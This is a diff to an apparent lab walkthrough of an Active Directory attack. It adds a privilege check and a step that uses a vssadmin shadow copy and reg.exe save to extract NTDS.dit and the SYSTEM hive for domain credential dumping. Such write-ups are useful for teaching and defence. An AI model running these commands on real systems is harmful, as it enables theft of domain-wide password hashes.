@@ -115,7 +115,7 @@ Mandatory Label\Medium Mandatory Level        Label            S-1-16-8192
 ```
 ```
 
-Step15. Now we will shadow copy and extract **ntds.dit** and **SYSTEM** hive, but before that we will elevate from normal user to admin.
+Step15. Now we will shadow copy and extract **ntds.dit** and **SYSTEM** hive, but before that we will elevate from normal user to admin and verify it as well.
 ```cmd
 Microsoft Windows [Version 10.0.17763.2628]
 (c) 2018 Microsoft Corporation. All rights reserved.
@@ -163,3 +163,77 @@ C:\Users\stom>
 ```
 ```
 ```
+b. System escalated to admin and verified.
+```cmd
+Microsoft Windows [Version 10.0.17763.2628]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Disabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
+SeSystemProfilePrivilege                  Profile system performance                                         Disabled
+SeSystemtimePrivilege                     Change the system time                                             Disabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
+SeBackupPrivilege                         Back up files and directories                                      Disabled
+SeRestorePrivilege                        Restore files and directories                                      Disabled
+SeShutdownPrivilege                       Shut down the system                                               Disabled
+SeDebugPrivilege                          Debug programs                                                     Disabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
+SeUndockPrivilege                         Remove computer from docking station                               Disabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Disabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
+SeTimeZonePrivilege                       Change the time zone                                               Disabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
+```
+
+Step16. We will now proceed with the **ntds.dit** and **SYSTEM** hive
+```cmd
+C:\Windows\system32>vssadmin create shadow /for=C:
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Copyright 2001-2013 Microsoft Corp.
+
+Successfully created shadow copy for 'C:\'
+    Shadow Copy ID: {4015b1bf-4fda-405e-ac3c-3c6769ff3727}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+
+C:\Windows\system32>mkdir C:\NTDS
+
+C:\Windows\system32>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\NTDS\NTDS.dit
+        1 file(s) copied.
+
+C:\Windows\system32>reg.exe save hklm\system C:\NTDS\SYSTEM
+The operation completed successfully.
+
+C:\Windows\system32>dir C:\NTDS
+ Volume in drive C has no label.
+ Volume Serial Number is C898-F1E2
+
+ Directory of C:\NTDS
+
+08/10/2026  09:25 AM    <DIR>          .
+08/10/2026  09:25 AM    <DIR>          ..
+08/10/2026  08:51 AM        16,777,216 NTDS.dit
+08/10/2026  09:25 AM        16,228,352 SYSTEM
+               2 File(s)     33,005,568 bytes
+               2 Dir(s)   5,683,712,000 bytes free
+
+C:\Windows\system32>
+```
+
